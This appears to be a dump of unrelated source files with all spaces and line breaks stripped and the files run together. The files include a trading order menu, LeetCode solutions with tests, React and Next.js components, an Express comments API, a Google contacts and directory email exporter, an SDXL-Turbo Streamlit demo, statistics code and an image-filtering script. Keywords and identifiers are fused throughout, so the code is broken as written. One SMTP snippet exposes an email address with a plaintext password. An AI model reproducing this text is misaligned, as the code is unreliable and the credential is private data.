rev_orders.extend(self.print_orders(data,"open"))#Executedorderslogger.debug("RequestHeader:%s",response_executed.request.headers)logger.debug("ResponseBody:%s",response_executed.text)logger.debug(response_executed.text)print("\nExecutedOrders:")#Handleandparseresponseifresponse_executed.status_code==204:logger.debug(response_executed)print("None")elifresponse_executed.status_code==200:parsed=json.loads(response_executed.text)logger.debug(json.dumps(parsed,indent=4,sort_keys=True))data=response_executed.json()#Displaylistofexecutedordersprev_orders.extend(self.print_orders(data,"executed"))#Individualfillsorderslogger.debug("RequestHeader:%s",response_indiv_fills.request.headers)logger.debug("ResponseBody:%s",response_indiv_fills.text)print("\nIndividualFillsOrders:")#Handleandparseresponseifresponse_indiv_fills.status_code==204:logger.debug("ResponseBody:%s",response_indiv_fills)print("None")elifresponse_indiv_fills.status_code==200:parsed=json.loads(response_indiv_fills.text)logger.debug("ResponseBody:%s",json.dumps(parsed,indent=4,sort_keys=True))data=response_indiv_fills.json()#Displaylistofindividualfillsordersprev_orders.extend(self.print_orders(data,"indiv_fills"))#Cancelledorderslogger.debug("RequestHeader:%s",response_cancelled.request.headers)logger.debug("ResponseBody:%s",response_cancelled.text)print("\nCancelledOrders:")#Handleandparseresponseifresponse_cancelled.status_code==204:logger.debug(response_cancelled)print("None")elifresponse_cancelled.status_code==200:parsed=json.loads(response_cancelled.text)logger.debug(json.dumps(parsed,indent=4,sort_keys=True))data=response_cancelled.json()#Displaylistofopenordersprev_orders.extend(self.print_orders(data,"cancelled"))#Rejectedorderslogger.debug("RequestHeader:%s",response_rejected.request.headers)logger.debug("ResponseBody:%s",response_rejected.text)print("\nRejectedOrders:")#Handleandparseresponseifresponse_rejected.status_code==204:logger.debug(response_rejected)print("None")elifresponse_rejected.status_code==200:parsed=json.loads(response_rejected.text)logger.debug(json.dumps(parsed,indent=4,sort_keys=True))data=response_rejected.json()#Displaylistofopenordersprev_orders.extend(self.print_orders(data,"rejected"))#Expiredordersprint("\nExpiredOrders:")#Handleandparseresponseifresponse_expired.status_code==204:logger.debug(response_executed)print("None")elifresponse_expired.status_code==200:parsed=json.loads(response_expired.text)logger.debug(json.dumps(parsed,indent=4,sort_keys=True))data=response_expired.json()#Displaylistofopenordersprev_orders.extend(self.print_orders(data,"expired"))menu_list={"1":"PreviewOrder","2":"CancelOrder","3":"GoBack"}print("")options=menu_list.keys()forentryinoptions:print(entry+")\t"+menu_list[entry])selection=input("Pleaseselectanoption:")ifselection=="1":self.preview_order_menu(self.session,self.account,prev_orders)elifselection=="2":self.cancel_order()elifselection=="3":breakelse:print("UnknownOptionSelected!")importunittestclassSolution:deftwoSum(self,numbers:list[int],target:int)->list[int]:lower=0upper=len(numbers)-1while(lower<upper):total=numbers[lower]+numbers[upper]if(total==target):returnlower+1,upper+1elif(total<target):lower+=1else:#total>targetupper-=1classTestTwoSum(unittest.TestCase):deftest_example_1(self):numbers=[2,7,11,15]target=9self.assertEqual(Solution().twoSum(numbers,target),(1,2))deftest_example_2(self):numbers=[2,3,4]target=6self.assertEqual(Solution().twoSum(numbers,target),(1,3))deftest_example_3(self):numbers=[-1,0]target=-1self.assertEqual(Solution().twoSum(numbers,target),(1,2))unittest.main()'useclient';import{useState,useEffect}from'react';constCharadesClone=()=>{constwordsList=['Elephant','Banana','SpaceShuttle','Astronaut','Guitar','Penguin','Soccer'];const[currentWordIndex,setCurrentWordIndex]=useState(0);const[timer,setTimer]=useState(60);//60-secondtimerconst[gameOver,setGameOver]=useState(false);const[score,setScore]=useState(0);//TimercountdownlogicuseEffect(()=>{if(timer>0&&!gameOver){constinterval=setInterval(()=>{setTimer((prevTimer)=>prevTimer-1);},1000);return()=>clearInterval(interval);}elseif(timer===0){setGameOver(true);}},[timer,gameOver]);//Functiontohandleflippingup(correctguess)consthandleFlipUp=()=>{setScore(score+1);nextWord();};//Functiontohandleflippingdown(skipword)consthandleFlipDown=()=>{nextWord();};//FunctiontomovetothenextwordconstnextWord=()=>{if(currentWordIndex<wordsList.length-1){setCurrentWordIndex(currentWordIndex+1);}else{setGameOver(true);}};//FunctiontoresetthegameconstresetGame=()=>{setCurrentWordIndex(0);setTimer(60);setGameOver(false);setScore(0);};return(<divstyle={{textAlign:'center',marginTop:'50px'}}><h1>CharadesClone</h1>{gameOver?(<div><h2>GameOver!</h2><p>YourScore:{score}</p><buttononClick={resetGame}>PlayAgain</button></div>):(<div><h2>TimeLeft:{timer}s</h2><h3>{wordsList[currentWordIndex]}</h3><divstyle={{marginTop:'20px'}}><buttononClick={handleFlipUp}style={{marginRight:'10px',padding:'10px20px',backgroundColor:'green',color:'white'}}>FlipUp(Correct)</button><buttononClick={handleFlipDown}style={{padding:'10px20px',backgroundColor:'red',color:'white'}}>FlipDown(Skip)</button></div></div>)}</div>);};exportdefaultCharadesClone;importpandasaspdfromprocess_questionsimportdfasdf_questionsfromprocess_answersimportdfasdf_answerscategory='BusinessManagementandAdministration'id=1273df=pd.concat([df_questions,df_answers],axis=1)df['id']=iddf['category']=category#moveidandcategorytothefrontdf=df[df.columns.tolist()[-2:]+df.columns.tolist()[:-2]]df.to_clipboard(index=False)fromgoogleapiclient.discoveryimportbuildfromgoogle_auth_oauthlib.flowimportInstalledAppFlowfromgoogle.oauth2.credentialsimportCredentialsfromgoogle.auth.transport.requestsimportRequestimportos.pathimportthreading#Ifmodifyingthesescopes,deletethefiletoken.json.SCOPES=["https://www.googleapis.com/auth/contacts.readonly","https://www.googleapis.com/auth/directory.readonly"]data:list=[]defwrap_error(func):"""UsedtoensureotherfunctionexecutiondoesntstopduetooccurenceofanexceptionThanksalot:https://stackoverflow.com/a/40102885/21615084"""deffunc_wrapper(*args,**kwargs):try:returnfunc(*args,**kwargs)exceptExceptionase:print(e)returnfunc_wrapperdefauthenticate()->None:"""AuthenticateuserusingGoogleOAuth"""creds=None#Thefiletoken.jsonstorestheuser'saccessandrefreshtokens,andis#createdautomaticallywhentheauthorizationflowcompletesforthefirst#time.ifos.path.exists("token.json"):creds=Credentials.from_authorized_user_file("token.json",SCOPES)#Ifthereareno(valid)credentialsavailable,lettheuserlogin.ifnotcredsornotcreds.valid:print("Usernotauthenticated...AuthenticationflowStarted...")ifcredsandcreds.expiredandcreds.refresh_token:creds.refresh(Request())else:flow=InstalledAppFlow.from_client_secrets_file("credentials.json",SCOPES)creds=flow.run_local_server(port=8080)#Savethecredentialsforthenextrunwithopen("token.json","w")astoken:token.write(creds.to_json())ifcreds.valid:print("Userauthenticated")try:service=build("people","v1",credentials=creds)fetch_contacts(service)fetch_directory_contacts(service)exceptExceptionaserr:print("Error:",err)@wrap_errordeffetch_contacts(service):finished:bool=Falsenext_page_token:str=Nonedata:set=set()count:int=0print("FetchingContacts...",end="\r")whilenotfinished:results=service.people().connections().list(resourceName='people/me',personFields='names,emailAddresses',pageSize=1000,).execute()connections=results.get("connections",[])count+=len(connections)#Incrementthecountofrecordsfetchedprint(f"FetchingContacts{count}...",end='\r')forpersoninconnections:#Storeemailaddresses(ifmultiple)inalistafterfetchingfromdictemailAddresses:list=person.get("emailAddresses",[])#CheckifthevalueexistsifemailAddresses:foremailinemailAddresses:#Iterateoverlistsdata.add(email['value'].strip())#Fetchthenextpageofresults(1k)next_page_token=results.get('nextPageToken')#Ifnomoreresultsthenexitthewhileloopfinished=notnext_page_tokenwrite_contacts_file(data)@wrap_errordeffetch_directory_contacts(service)->None:"""FetchallthecontactsfromDirectory"""finished:bool=Falsenext_page_token:str=Nonedata:set=set()count:int=0print("FetchingDirectoryContacts...",end='\r')whilenotfinished:#Fetchresultsoflistingdirectoryresults=service.people().listDirectoryPeople(readMask='names,emailAddresses',pageSize=1000,sources="DIRECTORY_SOURCE_TYPE_DOMAIN_PROFILE",pageToken=next_page_token,).execute()result=results.get('people',[])count+=len(result)#Incrementthecountofrecordsfetchedprint(f"FetchingDirectoryContacts{count}...",end='\r')forpersoninresult:#Storeemailaddresses(ifmultiple)inalistafterfetchingfromdictemailAddresses:list=person.get("emailAddresses",[])#CheckifthevalueexistsifemailAddresses:foremailinemailAddresses:#Iterateoverlistsdata.add(email['value'].strip())#Fetchthenextpageofresults(1k)next_page_token=results.get('nextPageToken')#Ifnomoreresultsthenexitthewhileloopfinished=notnext_page_tokenwrite_directory_file(data)defperform_write(list:list,filename:str,contact_type:str)->None:"""Writethecontentsofalisttothespecifiedfilename"""iflist:withopen(filename,"w")asfile:fori,datainenumerate(list):print(f"Progress(WritingtoFile):{i}/{len(list)}",end='\r')file.write(data+"\n")print(f"{filename}SuccessfullyWritten!")else:print(f"{contact_type}isEmpty!NoRecordsfound!")defwrite_contacts_file(data_set:set)->None:""""""data:list=sorted(data_set)threading.Thread(target=perform_write,args=(data,"contacts_emails.txt","PersonalContacts")).start()defwrite_directory_file(data_set:set)->None:"""Create2threadstowriteto2files.File1(directory_emails_alphabetic.txt)containsemailssortedbytheirname.File2(directory_emails_domain.txt)containsemailssortedbythedomain"""ifnotdata_set:print("NoDirectoryExists!")returndata:list=sorted(data_set)data_sortby_domain:list=sorted(data_set,key=domain)thread1=threading.Thread(target=perform_write,args=(data,"directory_emails_alphabetic.txt","DirectoryContacts"))thread2=threading.Thread(target=perform_write,args=(data_sortby_domain,"directory_emails_domain.txt","DirectoryContacts"))thread1.start()thread2.start()defdomain(email)->str:"""Returnthedomainsofthespecifiedemail"""_,domain=email.split('@')returndomainif__name__=="__main__":authenticate()const{format}=require('date-fns');const{v4:uuid}=require('uuid');constfs=require('fs');constfsPromises=require('fs').promises;constpath=require('path');constlogEvents=async(message,logFileName)=>{constdateTime=format(newDate(),'yyyyMMdd\tHH:mm:ss');constlogItem=`${dateTime}\t${uuid()}\t${message}\n`;try{if(!fs.existsSync(path.join(__dirname,'..','logs'))){awaitfsPromises.mkdir(path.join(__dirname,'..','logs'));}awaitfsPromises.appendFile(path.join(__dirname,'..','logs',logFileName),logItem);}catch(err){console.log(err);}};constlogger=(req,res,next)=>{logEvents(`${req.method}\t${req.url}\t${req.headers.origin}`,'reqLog.log');console.log(`${req.method}${req.path}`);next();};module.exports={logEvents,logger};importnumpyasnpfromvisualizeimportplot_pointsdefshape(x,y)->bool:returnall([y<x**2,y>0,])defread_points(file:str):withopen(file)asf:lines=f.readlines()points=[tuple(map(float,line.split()))forlineinlines]returnpointsdefgenerate_points(xmin,xmax,ymin,ymax,spacing):points=[]forxinnp.arange(xmin,xmax,spacing):foryinnp.arange(ymin,ymax,spacing):#roundbasedonspacingdigits=int(-np.log10(spacing)+1)x,y=map(lambdax:round(x,digits),(x,y))ifshape(x,y):points.append((x,y))returnpointsdefgenerate_files(points):withopen('points.txt','w')asf:forx,yinpoints:f.write(f'{x}{y}\n')fig,ax=plot_points(points)fig.savefig('points.png')if__name__=='__main__':points=generate_points(-1,1,-1,1,0.01)generate_files(points)importsmtplibimportsslsender='dain6213@my.sduhsd.net'receiver='dain6213@my.sduhsd.net'password='aA1!4444'message='''\Subject:testthisisatest'''context=ssl.create_default_context()withsmtplib.SMTP_SSL('smtp.gmail.com',465,context=context)asserver:server.login(sender,password)server.sendmail(sender,receiver,message)constUser=require('../models/User');constGame=require('../models/Game');constComment=require('../models/Comment');constasyncHandler=require('express-async-handler');constgetAllComments=asyncHandler(async(req,res)=>{constcomments=awaitComment.find().populate('user','username').lean();if(!comments?.length){returnres.status(400).json({message:'Nocommentsfound'});}res.json(comments);});constgetCommentById=asyncHandler(async(req,res)=>{constcommentId=req.params.id;constcomment=awaitComment.findById(commentId).populate('user','username').lean();if(!comment){returnres.status(400).json({message:'Commentnotfound'});}res.json(comment);});constgetCommentsByGameId=asyncHandler(async(req,res)=>{constgameId=req.params.id;constcomments=awaitComment.find({game:gameId}).populate('user','username').lean();if(!comments?.length){returnres.status(400).json({message:'Nocommentsfound'});}res.json(comments);});constgetCommentsByUserId=asyncHandler(async(req,res)=>{constuserId=req.params.id;constcomments=awaitComment.find({user:userId}).populate('user','username').lean();if(!comments?.length){returnres.status(400).json({message:'Nocommentsfound'});}res.json(comments);});constcreateNewComment=asyncHandler(async(req,res)=>{const{user,game,content,move}=req.body;if(!user||!game||!content||!move){returnres.status(400).json({message:'Allfieldsarerequired'});}letcomment;if(move!==undefined&&move!==null){comment=awaitComment.create({user,game,content,move});}else{comment=awaitComment.create({user,game,content});}if(comment){res.status(201).json({message:'Commentcreatedsuccessfully',comment});}else{res.status(400).json({message:'Invalidcommentdatareceived'});}});constupdateComment=asyncHandler(async(req,res)=>{const{id,content}=req.body;if(!id||!content){returnres.status(400).json({message:'Allfieldsarerequired'});}constcomment=awaitComment.findById(id).exec();if(!comment){returnres.status(400).json({message:'Commentnotfound'});}comment.content=content;constupdatedComment=awaitcomment.save();res.json({message:`${updatedComment.id}updated`});});constdeleteComment=asyncHandler(async(req,res)=>{const{commentId,userId}=req.body;if(!commentId||!userId){returnres.status(400).json({message:'Allfieldsarerequired'});}constcomment=awaitComment.findById(commentId).exec();if(!comment){returnres.status(400).json({message:'Commentnotfound'});}constuser=awaitUser.findById(userId).exec();if(!user){returnres.status(400).json({message:'Usernotfound'});}if(comment.user.toString()!==user.id.toString()){returnres.status(400).json({message:'Usernotauthorizedtodeletethiscomment'});}constdeletedComment=awaitcomment.remove();constreply=`Comment${deletedComment.id}deleted`;res.json({message:reply});});module.exports={getAllComments,getCommentById,getCommentsByGameId,getCommentsByUserId,createNewComment,updateComment,deleteComment,};fromgptimportGingerFormatteressay='thisisatest'output=(additionalParse:=GingerFormatter(essay)).formatter(additionalParse.supplementaryParser())print(output)fromst_keyupimportst_keyupfromstreamlit_helpersimport*fromsgm.modules.diffusionmodules.samplingimportEulerAncestralSamplerVERSION2SPECS={"SDXL-Turbo":{"H":512,"W":512,"C":4,"f":8,"is_legacy":False,"config":"configs/inference/sd_xl_base.yaml","ckpt":"checkpoints/sd_xl_turbo_1.0.safetensors",},"SD-Turbo":{"H":512,"W":512,"C":4,"f":8,"is_legacy":False,"config":"configs/inference/sd_2_1.yaml","ckpt":"checkpoints/sd_turbo.safetensors",},}classSubstepSampler(EulerAncestralSampler):def__init__(self,n_sample_steps=1,*args,**kwargs):super().__init__(*args,**kwargs)self.n_sample_steps=n_sample_stepsself.steps_subset=[0,100,200,300,1000]defprepare_sampling_loop(self,x,cond,uc=None,num_steps=None):sigmas=self.discretization(self.num_stepsifnum_stepsisNoneelsenum_steps,device=self.device)sigmas=sigmas[self.steps_subset[:self.n_sample_steps]+self.steps_subset[-1:]]uc=condx*=torch.sqrt(1.0+sigmas[0]**2.0)num_sigmas=len(sigmas)s_in=x.new_ones([x.shape[0]])returnx,s_in,sigmas,num_sigmas,cond,ucdefseeded_randn(shape,seed):randn=np.random.RandomState(seed).randn(*shape)randn=torch.from_numpy(randn).to(device="cuda",dtype=torch.float32)returnrandnclassSeededNoise:def__init__(self,seed):self.seed=seeddef__call__(self,x):self.seed=self.seed+1returnseeded_randn(x.shape,self.seed)definit_embedder_options(keys,init_dict,prompt=None,negative_prompt=None):value_dict={}forkeyinkeys:ifkey=="txt":value_dict["prompt"]=promptvalue_dict["negative_prompt"]=""ifkey=="original_size_as_tuple":orig_width=init_dict["orig_width"]orig_height=init_dict["orig_height"]value_dict["orig_width"]=orig_widthvalue_dict["orig_height"]=orig_heightifkey=="crop_coords_top_left":crop_coord_top=0crop_coord_left=0value_dict["crop_coords_top"]=crop_coord_topvalue_dict["crop_coords_left"]=crop_coord_leftifkey=="aesthetic_score":value_dict["aesthetic_score"]=6.0value_dict["negative_aesthetic_score"]=2.5ifkey=="target_size_as_tuple":value_dict["target_width"]=init_dict["target_width"]value_dict["target_height"]=init_dict["target_height"]returnvalue_dictdefsample(model,sampler,prompt="Alushgardenwithoversizedflowersandvibrantcolors,inhabitedbyminiatureanimals.",H=1024,W=1024,seed=0,filter=None,):F=8C=4shape=(1,C,H//F,W//F)value_dict=init_embedder_options(keys=get_unique_embedder_keys_from_conditioner(model.conditioner),init_dict={"orig_width":W,"orig_height":H,"target_width":W,"target_height":H,},prompt=prompt,)ifseedisNone:seed=torch.seed()precision_scope=autocastwithtorch.no_grad():withprecision_scope("cuda"):batch,batch_uc=get_batch(get_unique_embedder_keys_from_conditioner(model.conditioner),value_dict,[1],)c=model.conditioner(batch)uc=Nonerandn=seeded_randn(shape,seed)defdenoiser(input,sigma,c):returnmodel.denoiser(model.model,input,sigma,c,)samples_z=sampler(denoiser,randn,cond=c,uc=uc)samples_x=model.decode_first_stage(samples_z)samples=torch.clamp((samples_x+1.0)/2.0,min=0.0,max=1.0)iffilterisnotNone:samples=filter(samples)samples=((255*samples).to(dtype=torch.uint8).permute(0,2,3,1).detach().cpu().numpy())returnsamplesdefv_spacer(height)->None:for_inrange(height):st.write("\n")if__name__=="__main__":st.title("Turbo")head_cols=st.columns([1,1,1])withhead_cols[0]:version=st.selectbox("ModelVersion",list(VERSION2SPECS.keys()),0)version_dict=VERSION2SPECS[version]withhead_cols[1]:v_spacer(2)ifst.checkbox("LoadModel"):mode="txt2img"else:mode="skip"ifmode!="skip":state=init_st(version_dict,load_filter=True)ifstate["msg"]:st.info(state["msg"])model=state["model"]load_model(model)#seedif"seed"notinst.session_state:st.session_state.seed=0defincrement_counter():st.session_state.seed+=1defdecrement_counter():ifst.session_state.seed>0:st.session_state.seed-=1withhead_cols[2]:n_steps=st.number_input(label="numberofsteps",min_value=1,max_value=4)sampler=SubstepSampler(n_sample_steps=1,num_steps=1000,eta=1.0,discretization_config=dict(target="sgm.modules.diffusionmodules.discretizer.LegacyDDPMDiscretization"),)sampler.n_sample_steps=n_stepsdefault_prompt=("Acinematicshotofababyracoonwearinganintricateitalianpriestrobe.")prompt=st_keyup("Enteravalue",value=default_prompt,debounce=300,key="interactive_text")cols=st.columns([1,5,1])ifmode!="skip":withcols[0]:v_spacer(14)st.button("↩",on_click=decrement_counter)withcols[2]:v_spacer(14)st.button("↪",on_click=increment_counter)sampler.noise_sampler=SeededNoise(seed=st.session_state.seed)out=sample(model,sampler,H=512,W=512,seed=st.session_state.seed,prompt=prompt,filter=state.get("filter"),)withcols[1]:st.image(out[0])importmathfromscipy.statsimportnormdefBIVAR(x1,x2,rho):ifx1*x2*rho>0:ifx1<0:sgn1=-1else:sgn1=1ifx2<0:sgn2=-1else:sgn2=1rho1=(rho*x1-x2)*sgn1/math.sqrt(x1*x1-2*rho*x1*x2+x2*x2)rho2=(rho*x2-x1)*sgn2/math.sqrt(x1*x1-2*rho*x1*x2+x2*x2)delta=(1-sgn1*sgn2)/4ifx1>0andrho1>=0:q1=0.5-altbivar(-x1,0,-rho1)elifx1>0andrho1<0:q1=norm.cdf(x1)-0.5+altbivar(-x1,0,rho1)elifx1<0andrho1>=0:q1=norm.cdf(x1)-altbivar(x1,0,-rho1)else:q1=altbivar(x1,0,rho1)ifx2>0andrho2>=0:q2=0.5-altbivar(-x2,0,-rho2)elifx2>0andrho2<0:q2=norm.cdf(x2)-0.5+altbivar(-x2,0,rho2)elifx2<0andrho2>=0:q2=norm.cdf(x2)-altbivar(x2,0,-rho2)else:q2=altbivar(x2,0,rho2)returnq1+q2-deltaelifx1<=0andx2<=0andrho<=0:returnaltbivar(x1,x2,rho)elifx1<=0andx2>=0andrho>=0:returnnorm.cdf(x1)-altbivar(x1,-x2,-rho)elifx1>=0andx2<=0andrho>=0:returnnorm.cdf(x2)-altbivar(-x1,x2,-rho)else:returnnorm.cdf(x1)+norm.cdf(x2)-1+altbivar(-x1,-x2,rho)defaltbivar(x1,x2,rho):a=[0.325303,0.4211071,0.1334425,0.006374323]b=[0.1337764,0.6243247,1.3425378,2.2626645]aa=x1/math.sqrt(2*(1-rho*rho))bb=x2/math.sqrt(2*(1-rho*rho))cum=0foriinrange(4):forjinrange(4):F=math.exp(aa*(2*b[i]-aa)+bb*(2*b[j]-bb)+2*rho*(b[i]-aa)*(b[j]-bb))cum+=a[i]*a[j]*Freturncum*math.sqrt(1-rho*rho)/math.pidefcumnorm(x):alpha=0.2316419a1=0.31938153a2=-0.356563782a3=1.781477937a4=-1.821255978a5=1.330274429q=1/(1+alpha*abs(x))primex=0.3989423*math.exp(-x*x*0.5)dum=a3+q*(a4+a5*q)primex*=q*(a1+q*(a2+q*dum))ifx<0:y=primexelse:y=1-primexreturnydefcorrcalc(t,rho,prob1,prob2):u=norm.ppf(prob1)v=norm.ppf(prob2)bothdef=BIVAR(u,v,rho)return(bothdef-prob1*prob2)/math.sqrt((prob1-prob1*prob1)*(prob2-prob2*prob2))x=0.05y=0.05rho=0#print(BIVAR(norm.ppf(x),norm.ppf(y),rho))#0.0025importmatplotlib.pyplotaspltfrommpl_toolkits.mplot3dimportAxes3Dimportnumpyasnpimportnumpyasnpimportmatplotlib.pyplotaspltfrommpl_toolkits.mplot3dimportAxes3Dfromscipy.statsimportnorm#yourfunctionshere...#definetherangeofxandyprobabilitiesx_probs=np.linspace(0.01,0.99,100)y_probs=np.linspace(0.01,0.99,100)#createameshgridofxandyprobabilitiesX,Y=np.meshgrid(x_probs,y_probs)#calculateBIVARforeachpairofxandyprobabilitiesZ=np.array([BIVAR(norm.ppf(x),norm.ppf(y),rho)forx,yinzip(np.ravel(X),np.ravel(Y))])#reshapeZtomatchtheshapeofXandYZ=Z.reshape(X.shape)#initializetheplotfig=plt.figure()ax=fig.add_subplot(111,projection='3d')#plotthesurfaceax.plot_surface(X,Y,Z,cmap='viridis')#setthelabelsax.set_xlabel('XProbability')ax.set_ylabel('YProbability')ax.set_zlabel('BIVAR(norm.ppf(x),norm.ppf(y),rho)')ax.set_title('3DplotofBIVAR(norm.ppf(x),norm.ppf(y),rho)')#showtheplotplt.show()importImagefrom'next/image';importNavbarfrom'../components/Navbar';importHerofrom'@/components/Hero';importAboutfrom'@/components/About';import{Inter}from'next/font/google';importHeadfrom'next/head';importCalendarfrom'@/components/Calendar';importTeamfrom'@/components/Team';importFaqfrom'@/components/Faq';importFooterfrom'@/components/Footer';importFeatureCardCollectionfrom'@/components/FeatureCardCollection';constfeatures=[{title:'Long-Lasting',description:'EnduraScribedryerasemarkerscanwriteupto1.5Xoftraditionaldryerasemarkerswhichmeansyougetmorewritingforyourmoney.TestedonaPen-CoreCircleWritingTester,ourmarkerslast50%longerthanleadingbrands.',image:'/stationery.png',},{title:'Reliable',description:'Ourliquidinkdriesquicklyanderaseseasilyfrommostnon-poroussurfacesandglass.Itisalsolowodorandemitsnounpleasantsmellslikeothermarkers.',image:'/stationery.png',},{title:'VisibleInkGague',description:'Weincorporateatransparentbarrelwithaprintedgaugesoyoualwaysknowhowmuchinkisleftinyourdryerasemarker.Nomoreguessingorrunningoutofinkunexpectedly!',image:'/stationery.png',},];exportdefaultfunctionHome(){return(<main><Head><title>EnduraScribe</title><linkrel='icon'href='/favicon.png'/></Head><Navbar/><Hero/><FeatureCardCollectionfeatures={features}/>{/*<About/>*/}{/*<Calendar/>*/}{/*<Team/>*/}{/*<Faq/>*/}<Footer/></main>);}import{useState}from'react';importcoursesfrom'@/data/courses';importsubjectsfrom'@/data/subjects';constAutocompleteInput=({k,addClass})=>{const[searchTerm,setSearchTerm]=useState('');const[suggestions,setSuggestions]=useState([]);const[selectedIndex,setSelectedIndex]=useState(0);//Defaulttofirstsuggestionselectedconst[isSubjectComplete,setIsSubjectComplete]=useState(false);consthandleInputChange=(e)=>{constterm=e.target.value;setSearchTerm(term);setSelectedIndex(0);if(term.trim()===''){setSuggestions([]);setIsSubjectComplete(false);}else{constsplitTerm=term.split('');constsubjectPart=splitTerm[0].toUpperCase();constnumberPart=splitTerm.slice(1).join('').toLowerCase();if(!isSubjectComplete){//Autocompleteforsubject(prefixmatch)constmatchingSubjects=subjects.filter((subject)=>subject.toLowerCase().startsWith(subjectPart.toLowerCase())).slice(0,k);//EnsureuniquesuggestionsconstuniqueSuggestions=[...newSet(matchingSubjects)];setSuggestions(uniqueSuggestions);//Checkifsubjectisfullytypedout(fullmatchwithoneofthesubjects)if(uniqueSuggestions.length===1&&uniqueSuggestions[0].toLowerCase()===subjectPart.toLowerCase()){setIsSubjectComplete(true);}}else{//Autocompleteforcoursenumberaftersubjectiscompleteif(courses[subjectPart]){constmatchingClasses=courses[subjectPart].filter((courseNumber)=>courseNumber.toLowerCase().includes(numberPart)).map((courseNumber)=>`${subjectPart}${courseNumber}`).sort((a,b)=>{//ExtractthenumericpartfromthecoursenumberandsortbyitconstnumA=parseInt(a.split('')[1]);constnumB=parseInt(b.split('')[1]);returnnumA-numB;}).slice(0,k);setSuggestions(matchingClasses);}else{setSuggestions([]);}}}};consthandleKeyDown=(e)=>{if(e.key==='ArrowDown'){//MoveselectiondownsetSelectedIndex((prevIndex)=>Math.min(prevIndex+1,suggestions.length-1));}elseif(e.key==='ArrowUp'){//MoveselectionupsetSelectedIndex((prevIndex)=>Math.max(prevIndex-1,0));}elseif(e.key==='Tab'&&selectedIndex>=0){//Replaceinputtextwiththeselectedsuggestionandaddaspaceafteritifit'sasubjecte.preventDefault();constselectedSuggestion=suggestions[selectedIndex];if(!isSubjectComplete&&subjects.includes(selectedSuggestion)){setSearchTerm(selectedSuggestion+'');setIsSubjectComplete(true);}else{setSearchTerm(selectedSuggestion);}setSuggestions([]);}elseif(e.key==='Enter'&&searchTerm.trim()!==''){//AddtheclasswhenEnterispressede.preventDefault();addClass(searchTerm.trim());setSearchTerm('');setSuggestions([]);setIsSubjectComplete(false);}};consthandleSuggestionClick=(index)=>{//UpdatetheinputtextwiththeclickedsuggestionconstselectedSuggestion=suggestions[index];if(!isSubjectComplete&&subjects.includes(selectedSuggestion)){setSearchTerm(selectedSuggestion+'');setIsSubjectComplete(true);}else{setSearchTerm(selectedSuggestion);}setSuggestions([]);};return(<divclassName='relativew-full'><inputtype='text'value={searchTerm}onChange={handleInputChange}onKeyDown={handleKeyDown}placeholder='Addaclass'className='borderp-2mt-4w-full'/>{suggestions.length>0&&(<ulclassName='absoluteleft-0right-0mt-1bg-whiteborderborder-gray-300rounded-mdshadow-lgmax-h-48overflow-y-autoz-10'>{suggestions.map((suggestion,index)=>(<likey={index}onClick={()=>handleSuggestionClick(index)}className={`p-2cursor-pointerhover:bg-gray-100${selectedIndex===index?'bg-gray-200':''}`}>{suggestion}</li>))}</ul>)}</div>);};exportdefaultAutocompleteInput;importunittestclassSolution:defproductExceptSelf(self,nums:list[int])->list[int]:output=[1]forninnums:output.append(output[-1]*n)product=1foriinrange(len(output)-1,0,-1):output[i]=output[i-1]*productproduct*=nums[i-1]deloutput[0]returnoutputclassTestSolution(unittest.TestCase):defsetUp(self):self.solution=Solution()deftestProductExceptSelf(self):self.assertListEqual(self.solution.productExceptSelf([1,2,3,4]),[24,12,8,6])self.assertListEqual(self.solution.productExceptSelf([-1,1,0,-3,3]),[0,0,9,0,0])unittest.main()importosimportclipimportnumpyasnpimporttorchimporttorchvision.transformsasTfromPILimportImageRESOURCES_ROOT="scripts/util/detection/"defpredict_proba(X,weights,biases):logits=X@weights.T+biasesproba=np.where(logits>=0,1/(1+np.exp(-logits)),np.exp(logits)/(1+np.exp(logits)))returnproba.Tdefload_model_weights(path:str):model_weights=np.load(path)returnmodel_weights["weights"],model_weights["biases"]defclip_process_images(images:torch.Tensor)->torch.Tensor:min_size=min(images.shape[-2:])returnT.Compose([T.CenterCrop(min_size),#TODO:thismightaffectthewatermark,checkthisT.Resize(224,interpolation=T.InterpolationMode.BICUBIC,antialias=True),T.Normalize((0.48145466,0.4578275,0.40821073),(0.26862954,0.26130258,0.27577711),),])(images)classDeepFloydDataFiltering(object):def__init__(self,verbose:bool=False,device:torch.device=torch.device("cpu")):super().__init__()self.verbose=verboseself._device=Noneself.clip_model,_=clip.load("ViT-L/14",device=device)self.clip_model.eval()self.cpu_w_weights,self.cpu_w_biases=load_model_weights(os.path.join(RESOURCES_ROOT,"w_head_v1.npz"))self.cpu_p_weights,self.cpu_p_biases=load_model_weights(os.path.join(RESOURCES_ROOT,"p_head_v1.npz"))self.w_threshold,self.p_threshold=0.5,0.5@torch.inference_mode()def__call__(self,images:torch.Tensor)->torch.Tensor:imgs=clip_process_images(images)ifself._deviceisNone:self._device=next(pforpinself.clip_model.parameters()).deviceimage_features=self.clip_model.encode_image(imgs.to(self._device))image_features=image_features.detach().cpu().numpy().astype(np.float16)p_pred=predict_proba(image_features,self.cpu_p_weights,self.cpu_p_biases)w_pred=predict_proba(image_features,self.cpu_w_weights,self.cpu_w_biases)print(f"p_pred={p_pred},w_pred={w_pred}")ifself.verboseelseNonequery=p_pred>self.p_thresholdifquery.sum()>0:print(f"Hitforp_threshold:{p_pred}")ifself.verboseelseNoneimages[query]=T.GaussianBlur(99,sigma=(100.0,100.0))(images[query])query=w_pred>self.w_thresholdifquery.sum()>0:print(f"Hitforw_threshold:{w_pred}")ifself.verboseelseNoneimages[query]=T.GaussianBlur(99,sigma=(100.0,100.0))(images[query])returnimagesdefload_img(path:str)->torch.Tensor:image=Image.open(path)ifnotimage.mode=="RGB":image=image.convert("RGB")image_transforms=T.Compose([T.ToTensor(),])returnimage_transforms(image)[None,...]deftest(root):fromeinopsimportrearrangefilter=DeepFloydDataFiltering(verbose=True)forpinos.listdir((root)):print(f"runningon{p}...")img=load_img(os.path.join(root,p))filtered_img=filter(img)filtered_img=rearrange(255.0*(filtered_img.numpy())[0],"chw->hwc").astype(np.uint8)Image.fromarray(filtered_img).save(os.path.join(root,f"{os.path.splitext(p)[0]}-filtered.jpg"))if__name__=="__main__":importfirefire.Fire(test)print("done.")importloggingimportmathimportrefromabcimportabstractmethodfromcontextlibimportcontextmanagerfromtypingimportAny,Dict,List,Optional,Tuple,Unionimportpytorch_lightningasplimporttorchimporttorch.nnasnnfromeinopsimportrearrangefrompackagingimportversionfrom..modules.autoencoding.regularizersimportAbstractRegularizerfrom..modules.emaimportLitEmafrom..utilimport(default,